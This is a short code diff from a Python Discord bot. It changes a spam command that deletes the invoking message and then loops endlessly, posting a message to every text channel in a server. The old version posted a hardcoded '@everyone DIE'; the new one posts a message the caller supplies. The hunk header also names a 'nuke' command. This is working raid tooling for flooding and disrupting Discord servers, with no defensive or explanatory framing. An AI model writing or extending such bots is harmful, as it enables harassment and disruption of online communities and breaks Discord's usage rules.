@@ -49,13 +49,13 @@ async def nuke (ctx):
  
 
 @client.command()
-async def s(ctx):
+async def s(ctx, *, message ):
   guild=ctx.message.guild
   await ctx.message.delete()
   for i in range(2):
     print("spammed")
     while True:
            for channel in guild.text_channels:
-                 await channel.send("@everyone DIE")
+                 await channel.send(f"{message}")
 
 client.run(token)
